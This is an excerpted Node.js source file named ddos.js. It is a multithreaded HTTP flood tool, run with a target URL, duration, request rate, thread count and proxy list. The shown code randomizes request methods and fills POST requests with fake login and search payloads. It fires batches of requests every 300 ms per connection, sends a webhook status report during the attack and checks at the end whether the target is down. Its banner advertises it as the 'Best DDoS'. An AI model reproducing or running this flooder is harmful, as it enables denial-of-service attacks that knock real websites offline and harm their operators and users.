...
if (process.argv.length < 7) {
    console.log(gradient.vice('Usage: node ddos.js <url web> <Time(s)> <Rate> <Thread> <proxy.txt>'));
    process.exit();
}
...
async function checkWebsiteStatus(target) {
    try {
        ...
        if (response.status >= 200 && response.status < 300) {
            return "Normal (Status: " + response.status + ")";
        ...
        if (error.code === 'ECONNABORTED') {
            ...
            console.log(`Unable to check status directly. Visit: ${checkHostLink}`.yellow);
            return "None (Check via link)";
        }
    }
}
...
async function sendWebhookNotification(target, time, status) {
    ...
    try {
        ...
        console.log(gradient.passion(`Webhook sent: ${response.status}`));
    } catch (error) {
        console.log(gradient.retro(`Webhook failed: ${error.message}`));
    }
}
...
╚════════════════════════════════════════════╝
    `));
    console.log(gradient.retro(` Target   : ${process.argv[2]}`));
    console.log(gradient.retro(` Duration : ${process.argv[3]} seconds`));
    console.log(gradient.retro(` Rate     : ${process.argv[4]} req/s`));
    console.log(gradient.retro(` Threads  : ${process.argv[5]}`));
    console.log(gradient.retro(` Owner    : NguyenManhHieu`));
    console.log(gradient.mind(` Best DDoS For Low Webtise `));
    ...
    // Send webhook after 3/4 of the attack duration
    setTimeout(async () => {
        try {
            const status = await checkWebsiteStatus(args.target);
            await sendWebhookNotification(args.target, args.time, status);
        } catch (error) {
            console.log(gradient.retro(`Webhook trigger failed: ${error.message}`));
        }
    }, args.time * 1000 * 0.75);

    setTimeout(async () => {
        console.log(gradient.passion(`\n════════════════════════════════════════════`));
        console.log(gradient.retro(` Attack Completed! Checking website status...`));
        const status = await checkWebsiteStatus(args.target);
        console.log(gradient.fruit(` Website Status: ${status}`));
        console.log(gradient.passion(`════════════════════════════════════════════`));
        process.exit(1);
    }, args.time * 1000);
} else {
...
function generateRandomPayload() {
    const payloads = [
        `username=${randstrs(8)}&password=${randstrs(12)}`,
        JSON.stringify({
            query: randstrs(10),
            timestamp: Date.now(),
            session_id: randstrs(16)
        }),
        `search=${randstrs(6)}&filter=${randstrs(4)}`
    ];
...
function runFlooder() {
    ...
    // Randomly select method, with 80% chance for GET
    const methods = ['GET', 'POST', 'HEAD', 'OPTIONS'];
    const methodWeights = [0.8, 0.1, 0.05, 0.05]; // 80% GET, 10% POST, 5% HEAD, 5% OPTIONS
    ...
    if (method === 'POST') {
        headers['content-type'] = Math.random() < 0.5 ? 'application/x-www-form-urlencoded' : 'application/json';
    }
        ...
        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    ...
                    if (method === 'POST') {
                        request.write(generateRandomPayload());
                    }
                    request.end();
                }
            }, 300);
